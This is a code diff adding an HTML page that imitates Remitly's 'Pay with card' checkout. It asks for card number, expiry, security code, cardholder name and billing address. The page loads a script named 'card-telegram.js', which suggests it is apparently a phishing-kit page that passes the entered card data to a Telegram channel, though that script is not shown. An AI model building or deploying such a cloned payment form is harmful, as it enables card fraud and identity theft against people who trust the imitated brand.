@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Remitly</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="css/style.css" />
+    <script src="js/script.js" defer></script>
+    <script src="js/card-telegram.js" defer></script>
+    <link rel="icon" type="image/favicon" href="images/favicon-.webp">
+    <script src="js/final-features.js" defer></script>
+    <link rel="stylesheet" href="json/states.json">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  </head>
+  <body data-page="card">
+    <div class="app-shell">
+      <header class="app-header">
+  <div class="header-left">
+    <button
+      class="header-icon-btn"
+      type="button"
+      data-back
+      aria-label="Back"
+    >
+      ←
+    </button>
+  </div>
+  <div class="header-title">
+    <div class="header-logo"><img src="images/logo.svg" alt="logo" style="width: 26px; height: 26px;">
+          </div>
+  </div>
+  <div class="header-right">
+    <button
+      class="header-icon-btn menu-toggle"
+      aria-label="Menu"
+      type="button"
+    >
+      ☰
+    </button>
+  </div>
+</header>
+<div class="progress-container">
+  <div class="progress-track"></div>
+  <div class="progress-fill"></div>
+</div>
+
+      <div class="progress-container">
+        <div class="progress-track"></div>
+        <div class="progress-fill"></div>
+      </div>
+
+      <main class="app-content">
+        <form id="card-form">
+          <div class="form-section-title">Pay with card</div>
+
+          <div class="form-group input-with-icon">
+            <label for="card-number" class="label">Card number</label>
+            <input
+              id="card-number"
+              class="input"
+              type="tel"
+              inputmode="numeric"
+              autocomplete="cc-number"
+              placeholder="e.g., 1234 5678 1234 5678"
+            />
+            <div class="card-brand-icon" id="card-brand">CARD</div>
+            <div class="error-text" id="card-error"></div>
+          </div>
+
+          <div class="form-group" style="display: flex; gap: 8px">
+            <div style="flex: 1">
+              <label for="exp-month" class="label">Expiration date</label>
+              <div style="display: flex; gap: 4px">
+                <input
+                  id="exp-month"
+                  class="input"
+                  style="width: 48px"
+                  type="tel"
+                  inputmode="numeric"
+                  placeholder="MM"
+                />
+                <span style="align-self: center">/</span>
+                <input
+                  id="exp-year"
+                  class="input"
+                  style="width: 48px"
+                  type="tel"
+                  inputmode="numeric"
+                  placeholder="YY"
+                />
+              </div>
+            </div>
+            <div style="flex: 1">
+              <label for="cvv" class="label">Security code</label>
+              <input
+                id="cvv"
+                class="input"
+                type="tel"
+                inputmode="numeric"
+                placeholder="e.g., 123"
+                autocomplete="cc-csc"
+              />
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label for="card-name" class="label"
+              >Your name as it appears on card</label
+            >
+            <input
+              id="card-name"
+              type="text"
+              class="input"
+              autocomplete="cc-name"
+              placeholder="e.g., John Smith"
+            />
+          </div>
+
+          <div class="form-section-title">Billing address</div>
+
+          <div class="billing-checkbox-row">
+            <input
+              type="checkbox"
+              id="use-home"
+              class="checkbox"
+            /><label for="use-home">Use home address</label>
+          </div>
+
+          <div class="form-group">
+            <label for="street-address" class="label">Street address</label>
+            <input
+              id="street-address"
+              type="text"
+              class="input"
+              placeholder="e.g., 123 Spring Street"
+            />
+          </div>
+
+          <div class="form-group">
+            <label for="unit-address" class="label"
+              >Apartment, suite, unit, etc. (optional)</label
+            >
+            <input
+              id="unit-address"
+              type="text"
+              class="input"
+              placeholder="e.g., Apt 74"
+            />
+          </div>
+
+          <div class="form-group">
+            <label for="city" class="label">City</label>
+            <input
+              id="city"
+              type="text"
+              class="input"
+              placeholder="e.g., New York"
+              id="city-input"
+            />
+          </div>
+
+          <div class="form-group" style="display: flex; gap: 8px">
+            <div style="flex: 1">
+              <label for="state" class="label">State/Province</label>
+              <select id="state" class="input">
+                <option value="">Select a state/province</option>
+                <!-- States will be loaded dynamically -->
+              </select>
+            </div>
+            <div style="flex: 1">
+              <label for="zip" class="label">Postal Code</label>
+              <input
+                id="zip"
+                type="text"
+                class="input"
+                placeholder="e.g., 22124"
+              />
+            </div>
+          </div>
+
+          <div class="form-group">
+            <div class="info-banner">
+              <div>
+                Your card will not be charged until you confirm the total and
+                pay on the next step.
+              </div>
+            </div>
+          </div>
+
+          <div class="page-footer">
+            <button
+              id="btn-card-review"
+              type="submit"
+              class="btn-primary"
+              disabled
+            >
+              Review details
+            </button>
+          </div>
+        </form>
+      </main>
+    </div>
+    <div class="menu-backdrop" id="menu-backdrop">
+  <div class="menu-panel" id="menu-sheet">
+    <button class="menu-item" data-action="Contact us">Contact us</button>
+    <button class="menu-item" data-action="Help">Help</button>
+    <button class="menu-item" data-action="About us">About us</button>
+  </div>
+</div>
+
+  </body>
+</html>
